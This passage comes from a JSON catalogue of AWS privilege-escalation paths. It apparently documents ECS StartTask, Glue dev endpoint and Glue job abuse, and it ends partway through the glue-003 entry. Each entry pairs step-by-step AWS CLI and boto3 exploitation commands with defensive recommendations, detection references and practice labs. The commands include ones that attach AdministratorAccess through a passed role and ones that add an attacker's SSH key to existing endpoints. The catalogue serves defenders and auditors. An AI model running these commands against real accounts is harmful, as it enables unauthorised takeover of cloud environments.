    "description": "A principal with `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:StartTask` can create a new ECS task definition and attach an existing privileged IAM role to it, then start the task on an existing EC2 container instance. By registering a task definition with a malicious container command and starting it on an EC2-based ECS cluster, the attacker can execute arbitrary code with the permissions of the attached role, allowing privilege escalation. Unlike `ecs:RunTask` which works with both EC2 and Fargate launch types, `ecs:StartTask` is specifically for EC2 launch types and requires specifying an existing container instance ARN. This is a classic \"pass role to service\" privilege escalation pattern where the combination of task definition registration, role passing, and task execution permissions creates an indirect path to elevated privileges. The level of access gained depends on the permissions of the available roles.",
    "prerequisites": {
      "admin": [
        "An ECS cluster must exist with at least one registered EC2 container instance",
        "A role must exist that trusts ecs-tasks.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "An ECS cluster must exist with at least one registered EC2 container instance",
        "A role must exist that trusts ecs-tasks.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws sts get-caller-identity",
          "description": "Get your AWS account ID to construct resource ARNs"
        },
        {
          "step": 2,
          "command": "aws ecs list-clusters",
          "description": "Discover available ECS clusters in the account (optional but helpful for finding target cluster)"
        },
        {
          "step": 3,
          "command": "aws ecs list-container-instances --cluster CLUSTER_NAME",
          "description": "Retrieve container instance ARNs needed for StartTask command (requires an EC2-based cluster with registered instances)"
        },
        {
          "step": 4,
          "command": "aws ecs register-task-definition \\\n  --family privesc-task \\\n  --network-mode bridge \\\n  --task-role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --container-definitions '[{\n    \"name\": \"privesc-container\",\n    \"image\": \"amazonlinux:latest\",\n    \"memory\": 512,\n    \"essential\": true,\n    \"command\": [\n      \"/bin/sh\",\n      \"-c\",\n      \"aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && echo \\\"Successfully attached AdministratorAccess!\\\"\"\n    ]\n  }]'\n",
          "description": "Register a task definition with the privileged role and malicious container command that attaches AdministratorAccess to your user (use bridge network mode for EC2 compatibility)"
        },
        {
          "step": 5,
          "command": "aws ecs start-task --cluster CLUSTER_NAME --task-definition privesc-task --container-instances CONTAINER_INSTANCE_ARN",
          "description": "Start the task on a specific container instance to execute the container command with elevated privileges"
        },
        {
          "step": 6,
          "command": "aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN",
          "description": "Monitor the task status and wait for completion (status should change to RUNNING then STOPPED)"
        },
        {
          "step": 7,
          "command": "aws iam list-users --max-items 3",
          "description": "Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)"
        }
      ]
    },
    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.\n\nThis attack requires:\n1. The ability to register task definitions (`ecs:RegisterTaskDefinition`)\n2. The ability to start tasks on existing container instances (`ecs:StartTask`)\n3. The ability to pass a role to ECS tasks service (`iam:PassRole`)\n4. An ECS cluster with at least one registered EC2 container instance\n5. A role that trusts ecs-tasks.amazonaws.com\n\nNote: `ecs:StartTask` is specifically for EC2 launch types and requires specifying an existing container instance ARN. This differs from `ecs:RunTask`, which works with both EC2 and Fargate launch types and can automatically select placement.\n",
    "recommendation": "Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificECSTaskRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"ecs-tasks.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- **Separate Permissions**: Avoid granting `ecs:RegisterTaskDefinition`, `ecs:StartTask`, and `iam:PassRole` to the same principal\n- **Restrict Task Definition Registration**: Limit `ecs:RegisterTaskDefinition` to specific task definition family patterns or require approval workflows\n- **Service Role Controls**: Ensure ECS task roles follow least privilege and cannot modify IAM permissions\n- **Monitor CloudTrail**: Alert on `RegisterTaskDefinition` API calls where privileged roles are being passed, and monitor `StartTask` executions\n- **Monitor IAM Changes**: Alert on `AttachUserPolicy`, `PutUserPolicy`, `AttachRolePolicy`, and `PutRolePolicy` calls from ECS task service principals\n- **Service Control Policies**: Implement SCPs to prevent ECS task roles from modifying IAM policies\n- **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving ECS and PassRole\n- **Task Definition Review**: Review task definitions for suspicious container commands or entry points\n- **Role Trust Policies**: Review roles that trust ecs-tasks.amazonaws.com and ensure they follow least privilege\n- **Container Instance Access**: Restrict access to EC2 container instances and monitor for suspicious task executions\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown"
    },
    "references": [
      {
        "title": "Auditing iam:PassRole: A Problematic Privilege Escalation Permission",
        "url": "https://www.tenable.com/blog/auditing-iampassrole-a-problematic-privilege-escalation-permission"
      },
      {
        "title": "AWS - ECS Privesc",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ecs-privesc"
      },
      {
        "title": "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers",
        "url": "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"
      }
    ],
    "relatedPaths": [
      "ecs-001",
      "ecs-002",
      "ecs-003",
      "ecs-004",
      "ec2-001",
      "lambda-001",
      "codebuild-001",
      "cloudformation-001"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section and must trust ecs-tasks.amazonaws.com"
        },
        {
          "permission": "ecs:RegisterTaskDefinition",
          "resourceConstraints": "Must have permission to register ECS task definitions"
        },
        {
          "permission": "ecs:StartTask",
          "resourceConstraints": "Must have permission to start tasks on existing container instances"
        }
      ],
      "additional": [
        {
          "permission": "ecs:ListClusters",
          "resourceConstraints": "Helpful for discovering available ECS clusters"
        },
        {
          "permission": "ecs:DescribeClusters",
          "resourceConstraints": "Useful for viewing cluster details and configuration"
        },
        {
          "permission": "ecs:ListContainerInstances",
          "resourceConstraints": "Required to retrieve container instance ARNs needed for StartTask"
        },
        {
          "permission": "ecs:DescribeContainerInstances",
          "resourceConstraints": "Helpful for viewing container instance details and capacity"
        },
        {
          "permission": "ecs:DescribeTasks",
          "resourceConstraints": "Useful for monitoring task execution status and verifying successful exploitation"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles that trust ECS tasks to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+ecs-registertaskdefinition+ecs-starttask",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:PassRole, ecs:RegisterTaskDefinition, and ecs:StartTask permissions. Can be an IAM user or role. This path requires an existing ECS cluster with EC2 container instances.\n"
        },
        {
          "id": "task_definition",
          "label": "New ECS Task Definition",
          "type": "resource",
          "description": "The registered ECS task definition with the target role passed via iam:PassRole. Includes a container with commands to execute when launched on an EC2 container instance.\n"
        },
        {
          "id": "ecs_task",
          "label": "New Running ECS Task",
          "type": "resource",
          "description": "An ECS task running on an EC2 container instance, started via ecs:StartTask. Unlike RunTask, StartTask requires specifying the exact container instance ARN and only works with EC2 launch type (not Fargate).\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the ecs-tasks Service",
          "type": "resource",
          "description": "The IAM role passed to the task definition. Must trust ecs-tasks.amazonaws.com. The task automatically assumes this role when it runs on the container instance.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions, the attacker gains full administrative access via the task's actions executing on the EC2 container instance.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation with possible access to sensitive resources.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role has minimal permissions, the privilege escalation may not provide meaningful additional access.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "task_definition",
          "label": "iam:PassRole + ecs:RegisterTaskDefinition",
          "description": "The attacker registers a task definition that passes a privileged role. Uses bridge network mode for EC2 compatibility.\n\nCommand:\n```bash\naws ecs register-task-definition \\\n  --family privesc-task \\\n  --task-role-arn \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --network-mode bridge \\\n  --container-definitions '[{\"name\":\"exploit\",\"image\":\"amazonlinux:latest\",\"memory\":512,\"command\":[\"/bin/sh\",\"-c\",\"aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"]}]'\n```\n"
        },
        {
          "from": "task_definition",
          "to": "ecs_task",
          "label": "ecs:StartTask",
          "description": "The attacker starts the task on a specific EC2 container instance. Unlike RunTask, StartTask requires specifying the container instance ARN.\n\nCommand:\n```bash\naws ecs start-task \\\n  --cluster existing-cluster \\\n  --task-definition privesc-task \\\n  --container-instances arn:aws:ecs:region:account:container-instance/cluster-name/instance-id\n```\n"
        },
        {
          "from": "ecs_task",
          "to": "target_role",
          "label": "Task assumes role and executes",
          "description": "The task automatically assumes the target role and executes the containerized commands on the EC2 instance with the role's permissions.\n"
        },
        {
          "from": "target_role",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent, the task successfully escalates the starting principal to full administrative access.\n"
        },
        {
          "from": "target_role",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the task performs limited privilege escalation.\n"
        },
        {
          "from": "target_role",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role has minimal permissions, the task may not yield meaningful privilege escalation.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-11T01:49:54Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ecs/ecs-005.yaml"
  },
  {
    "id": "glue-001",
    "name": "iam:PassRole + glue:CreateDevEndpoint",
    "category": "service-passrole",
    "services": [
      "iam",
      "glue"
    ],
    "description": "A principal with `iam:PassRole` and `glue:CreateDevEndpoint` can create a new Glue development endpoint and attach an existing IAM role to it. Glue dev endpoints provide SSH/Zeppelin notebook access where arbitrary code can be executed with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts glue.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "A role must exist that trusts glue.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws glue create-dev-endpoint --endpoint-name privesc-endpoint \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --public-key \"$(cat ~/.ssh/id_rsa.pub)\"\n",
          "description": "Create a Glue development endpoint with the privileged role and your SSH public key"
        },
        {
          "step": 2,
          "command": "aws glue get-dev-endpoint --endpoint-name privesc-endpoint",
          "description": "Wait for the endpoint to become available and retrieve connection details"
        },
        {
          "step": 3,
          "command": "ssh glue@ENDPOINT_ADDRESS",
          "description": "SSH into the dev endpoint and execute code with elevated privileges"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificGlueRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `glue:CreateDevEndpoint` to authorized users only\n- Require dev endpoints to be created in private subnets with VPC endpoints\n- Monitor CloudTrail for Glue dev endpoint creation\n- Implement automated scanning for exposed dev endpoints\n",
    "discoveredBy": {
      "name": "Bishop Fox",
      "organization": "Bishop Fox"
    },
    "references": [
      {
        "title": "Well, That Escalated Quickly: How Abusing AWS API Can Lead to Admin Access",
        "url": "https://know.bishopfox.com/research/privilege-escalation-in-aws"
      },
      {
        "title": "IAM Vulnerable - Glue CreateDevEndpoint",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "glue-002",
      "ec2-001",
      "lambda-001"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L147-L150",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L550",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L59-L63"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+glue-createdevendpoint",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "Glue-PassExistingRoleToNewGlueDevEndpoint",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "glue:CreateDevEndpoint",
          "resourceConstraints": "Must have permission to create Glue development endpoints"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:PassRole and glue:CreateDevEndpoint permissions. Can be an IAM user or role.\n"
        },
        {
          "id": "dev_endpoint",
          "label": "New Glue Dev Endpoint",
          "type": "resource",
          "description": "New Glue development endpoint created with a privileged IAM role attached. Dev endpoints provide SSH access and Zeppelin notebook environments where arbitrary code can be executed. The endpoint runs on EC2 instances managed by AWS Glue, and the attached role's credentials are available to code running in the environment.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the glue Service",
          "type": "resource",
          "description": "IAM role passed to the Glue dev endpoint during creation. The role must trust glue.amazonaws.com to assume it. When the endpoint is active, code executed via SSH or Zeppelin notebooks runs with this role's permissions.\n"
        },
        {
          "id": "execute_code",
          "label": "Execute Code with Target Role Permissions",
          "type": "action",
          "color": "#99ccff",
          "description": "SSH into the dev endpoint or use the Zeppelin notebook interface to execute arbitrary code (Python, Scala, SQL) with the target role's credentials. The code can:\n- Use boto3 to make AWS API calls with the role's permissions\n- Modify IAM policies or create access keys for privilege escalation\n- Access data in S3, RDS, DynamoDB, or other AWS services\n- Query the instance metadata service for role credentials\n- Install additional tools or backdoors in the environment\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The target role has AdministratorAccess or equivalent permissions. The attacker gains full administrative access to the AWS account by executing code in the dev endpoint environment with the role's credentials.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target role has some elevated permissions but not full admin. This could provide access to sensitive data (S3 buckets, RDS databases, DynamoDB tables) or enable additional privilege escalation paths through IAM modification permissions.\n"
        },
        {
          "id": "no_access",
          "label": "Minimal Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target role only has minimal permissions (like logs:PutLogEvents or basic S3 read access). Limited usefulness for privilege escalation, though may still be valuable for reconnaissance.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "dev_endpoint",
          "label": "iam:PassRole + glue:CreateDevEndpoint",
          "description": "Create a new Glue development endpoint and pass the target role to it. The endpoint requires a public SSH key for authentication and takes several minutes to become available.\n\nCommand:\n```bash\naws glue create-dev-endpoint \\\n  --endpoint-name privesc-endpoint \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --public-key \"$(cat ~/.ssh/id_rsa.pub)\"\n```\n\nWait for the endpoint to reach the READY state before connecting.\n"
        },
        {
          "from": "dev_endpoint",
          "to": "target_role",
          "label": "Endpoint assumes role",
          "description": "The Glue dev endpoint automatically assumes the passed IAM role. The role's credentials become available to any code executed in the SSH session or Zeppelin notebook environment. The endpoint runs on EC2 instances in AWS-managed infrastructure.\n"
        },
        {
          "from": "target_role",
          "to": "execute_code",
          "label": "SSH access + code execution",
          "description": "Connect to the dev endpoint via SSH and execute arbitrary Python, Scala, or shell commands with the target role's permissions.\n\nCommands:\n```bash\n# Wait for endpoint to be ready and get address\naws glue get-dev-endpoint --endpoint-name privesc-endpoint\n\n# SSH into the endpoint\nssh glue@ENDPOINT_ADDRESS\n\n# Execute Python code with boto3 to use role permissions\npython3 -c \"import boto3; sts = boto3.client('sts'); print(sts.get_caller_identity())\"\n```\n\nAlternatively, access the Zeppelin notebook interface to run code interactively.\n"
        },
        {
          "from": "execute_code",
          "to": "admin",
          "label": "If target role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access by executing code in the dev endpoint. They can modify IAM policies, create access keys, or perform any AWS action.\n"
        },
        {
          "from": "execute_code",
          "to": "some_perms",
          "label": "If target role has some elevated permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has some elevated permissions (data access, IAM read/write, etc.), the attacker can leverage these through the dev endpoint. This might include accessing sensitive data stores or pursuing additional privilege escalation techniques.\n"
        },
        {
          "from": "execute_code",
          "to": "no_access",
          "label": "If target role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal permissions (like logs:PutLogEvents or basic read access), the privilege escalation provides limited value. However, even minimal access could be useful for reconnaissance or as part of a multi-step attack chain.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/glue/glue-001.yaml"
  },
  {
    "id": "glue-002",
    "name": "glue:UpdateDevEndpoint",
    "category": "access-resource",
    "services": [
      "glue"
    ],
    "description": "A principal with `glue:UpdateDevEndpoint` can update an existing Glue development endpoint to add their SSH public key, granting them SSH access to the endpoint. Since the endpoint executes with the permissions of its attached IAM role, the attacker gains the privileges of that role. This path doesn't require `iam:PassRole` as the role is already attached.",
    "prerequisites": {
      "admin": [
        "A Glue development endpoint must already exist",
        "The endpoint's attached role must have administrative permissions"
      ],
      "lateral": [
        "A Glue development endpoint must already exist"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws glue get-dev-endpoints",
          "description": "List existing Glue development endpoints and their attached roles"
        },
        {
          "step": 2,
          "command": "aws glue update-dev-endpoint --endpoint-name TARGET_ENDPOINT \\\n  --add-public-keys \"$(cat ~/.ssh/id_rsa.pub)\"\n",
          "description": "Add your SSH public key to an existing privileged dev endpoint"
        },
        {
          "step": 3,
          "command": "aws glue get-dev-endpoint --endpoint-name TARGET_ENDPOINT",
          "description": "Retrieve the endpoint address"
        },
        {
          "step": 4,
          "command": "ssh glue@ENDPOINT_ADDRESS",
          "description": "SSH into the dev endpoint and execute code with the endpoint's role permissions"
        }
      ]
    },
    "recommendation": "Restrict access to `glue:UpdateDevEndpoint` using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"glue:UpdateDevEndpoint\",\n  \"Resource\": \"arn:aws:glue:REGION:ACCOUNT_ID:devEndpoint/SpecificEndpoint\"\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for UpdateDevEndpoint API calls\n- Alert on public key additions to dev endpoints\n- Regularly audit dev endpoint SSH keys\n- Implement automated remediation for unauthorized key additions\n- Consider using session-based access instead of SSH keys\n",
    "discoveredBy": {
      "name": "Bishop Fox",
      "organization": "Bishop Fox"
    },
    "references": [
      {
        "title": "Well, That Escalated Quickly: How Abusing AWS API Can Lead to Admin Access",
        "url": "https://know.bishopfox.com/research/privilege-escalation-in-aws"
      },
      {
        "title": "IAM Vulnerable - Glue UpdateDevEndpoint",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "glue-001",
      "ssm-001",
      "ec2-002"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L166",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L471",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L69"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/glue-updatedevendpoint",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "Glue-UpdateExistingGlueDevEndpoint",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "glue_privesc",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS Glue attacks including dev endpoint exploitation"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with glue:UpdateDevEndpoint permission. Can be an IAM user or role. This principal can modify existing Glue development endpoints to add their SSH public key.\n"
        },
        {
          "id": "dev_endpoint",
          "label": "Existing Glue Dev Endpoint",
          "type": "resource",
          "description": "An existing Glue development endpoint that can be accessed via SSH. The endpoint executes with the permissions of its attached IAM role. The attacker updates this endpoint to add their SSH public key, granting them SSH access.\n"
        },
        {
          "id": "target_role",
          "label": "Target Role",
          "type": "resource",
          "description": "IAM role attached to the Glue development endpoint. This role must trust glue.amazonaws.com to assume it. When the attacker SSHs into the endpoint, they can execute code and make AWS API calls with this role's permissions.\n"
        },
        {
          "id": "ssh_access",
          "label": "SSH into Endpoint",
          "type": "action",
          "color": "#99ccff",
          "description": "After adding the SSH public key to the dev endpoint, the attacker can SSH into it and execute commands. The endpoint's AWS credentials are available in the environment, allowing the attacker to make AWS API calls with the target role's permissions.\n\nCommand:\n```bash\nssh glue@ENDPOINT_ADDRESS\n```\n\nOnce connected, the attacker can use the AWS CLI or SDKs to interact with AWS services using the endpoint's role credentials.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access to the AWS account by executing commands from within the Glue dev endpoint.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB) or permissions that enable additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions or no interesting permissions beyond what the starting principal already had, the privilege escalation provides limited value.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "dev_endpoint",
          "label": "glue:UpdateDevEndpoint",
          "description": "Update an existing Glue development endpoint to add the attacker's SSH public key. This grants SSH access to the endpoint without requiring iam:PassRole since the role is already attached.\n\nCommand:\n```bash\naws glue update-dev-endpoint \\\n  --endpoint-name TARGET_ENDPOINT \\\n  --add-public-keys \"$(cat ~/.ssh/id_rsa.pub)\"\n```\n\nThe endpoint must already exist with an IAM role attached. Use glue:GetDevEndpoints to discover available endpoints and their roles.\n"
        },
        {
          "from": "dev_endpoint",
          "to": "target_role",
          "label": "Endpoint executes with role",
          "description": "The Glue development endpoint automatically executes with the permissions of its attached IAM role. The endpoint's environment includes AWS credentials for this role, accessible to any code executed within the endpoint.\n"
        },
        {
          "from": "target_role",
          "to": "ssh_access",
          "label": "SSH into endpoint",
          "description": "After adding the SSH public key, retrieve the endpoint address and SSH into it. Once connected, the attacker can execute AWS CLI commands or run scripts that leverage the target role's permissions.\n\nCommands:\n```bash\n# Get endpoint address\naws glue get-dev-endpoint --endpoint-name TARGET_ENDPOINT\n\n# SSH into endpoint\nssh glue@ENDPOINT_ADDRESS\n```\n"
        },
        {
          "from": "ssh_access",
          "to": "admin",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access to the account from within the Glue dev endpoint.\n"
        },
        {
          "from": "ssh_access",
          "to": "some_perms",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated permissions like S3 read/write, database access, or other privilege escalation permissions, the attacker can leverage these for further attacks or data exfiltration.\n"
        },
        {
          "from": "ssh_access",
          "to": "no_access",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal permissions (like basic Glue job execution), there may be limited value in the privilege escalation beyond the starting principal's existing access.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "glue:UpdateDevEndpoint",
          "resourceConstraints": "Target dev endpoint must be in the Resource section"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/glue/glue-002.yaml"
  },
  {
    "id": "glue-003",
    "name": "iam:PassRole + glue:CreateJob + glue:StartJobRun",
    "category": "service-passrole",
    "services": [
      "iam",
      "glue"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Must be able to pass a role to glue.amazonaws.com"
        },
        {
          "permission": "glue:CreateJob",
          "resourceConstraints": "Must be able to create Glue jobs"
        },
        {
          "permission": "glue:StartJobRun",
          "resourceConstraints": "Must be able to start Glue job runs"
        }
      ],
      "additional": [
        {
          "permission": "glue:GetJob",
          "resourceConstraints": "Helpful for retrieving job details and verifying configuration"
        },
        {
          "permission": "glue:GetJobRun",
          "resourceConstraints": "Useful for monitoring job execution status"
        },
        {
          "permission": "glue:GetJobRuns",
          "resourceConstraints": "Helpful for listing job runs to track execution"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available privileged roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "description": "A principal with `iam:PassRole`, `glue:CreateJob`, and `glue:StartJobRun` can create an AWS Glue job with a privileged IAM role and execute Python code that modifies IAM permissions. AWS Glue jobs are serverless ETL (Extract, Transform, Load) workloads that run Python or Scala scripts in a managed environment. When creating a Glue job, an IAM role must be assigned that grants permissions to the job's execution environment. If an attacker can pass a privileged role to a Glue job and control the job's code (via S3 script location or inline commands), they can execute arbitrary Python code with administrative permissions to attach policies, create access keys, or perform other IAM modifications. This is a cost-effective attack method (~$0.44/DPU-hour with 0.0625 DPU minimum for Python shell jobs) that executes quickly (1-2 minutes) and is more practical than using Glue development endpoints (~$2.20/hour). The attacker creates a job with malicious Python code, passes an administrative role during job creation, manually starts the job execution, and the job modifies IAM permissions to grant the starting principal administrative access.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts glue.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "A role must exist that trusts glue.amazonaws.com to assume it",
        "The role's permissions determine the level of access gained"
      ]
    },
    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available in the environment, you gain access limited to those role's permissions. However, even limited access may enable multi-hop attacks or access to sensitive data. The level of access depends entirely on the permissions of the role that can be passed to the Glue service.\n",
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Create Python script that attaches admin policy (upload to S3 or use inline)\n# Example script content:\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='target-username',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n",
          "description": "Prepare a Python script that will attach AdministratorAccess policy to your starting principal. This script can be uploaded to an S3 bucket or provided inline."
        },
        {
          "step": 2,
